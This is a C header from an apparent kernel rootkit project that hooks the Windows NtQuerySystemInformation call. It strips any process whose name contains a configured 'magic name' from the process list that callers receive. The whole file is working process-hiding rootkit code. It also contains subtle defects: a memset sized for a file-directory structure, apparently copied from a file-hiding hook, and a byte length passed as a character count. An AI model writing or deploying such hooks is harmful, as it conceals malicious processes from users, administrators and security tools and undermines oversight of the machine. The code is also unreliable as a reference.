#pragma once
#include "Settings.h"

// macro source: https://stackoverflow.com/questions/3437404/min-and-max-in-c
#define MIN(a,b) (((a)<(b))?(a):(b))

// source: https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    CHAR Reserved1[48]; // was BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(*NtQuerySystemInformation_t)(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
	);

static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
static NtQuerySystemInformation_t OriginalNtQuerySystemInformation = NULL;

NTSTATUS DetourNtQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength)
{
	NTSTATUS OriginalStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {		
		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);

        SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;

        if (ProcessInformationPtr) {
            while (1) {
                //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
                WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
                //kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws\n", ProcessNameBuffer);

				if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
					kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
				}

				if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {

					// Not the last one
					if (ProcessInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						SYSTEM_PROCESS_INFORMATION* TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
						ULONG ProcessInformationBufferSizeToEnd = 0;
						while (TempProcessInformationPtr->NextEntryOffset != 0) {
							ProcessInformationBufferSizeToEnd += TempProcessInformationPtr->NextEntryOffset;
							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size
						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION);

						// next structure address - start copying from there
						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);

						memcpy(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousProcessInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(ProcessInformationPtr, 0, sizeof(FILE_DIRECTORY_INFORMATION));
						break;
					}
				}

                if (ProcessInformationPtr->NextEntryOffset == 0) break;
                ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
            }
        }
	}
	
	return OriginalStatus;
}